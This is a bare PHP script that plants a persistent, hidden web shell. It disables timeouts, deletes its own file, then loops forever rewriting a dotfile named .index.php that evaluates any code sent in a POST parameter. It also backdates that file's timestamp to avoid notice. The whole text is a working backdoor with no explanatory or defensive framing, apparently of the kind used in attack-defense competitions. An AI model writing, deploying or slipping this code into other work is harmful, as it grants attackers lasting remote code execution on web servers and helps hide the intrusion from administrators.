<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.index.php';
$code = '<?php @eval($_POST[a]); ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2017-11-17 15:20:54" .index.php');
    usleep(50000);
}
?>

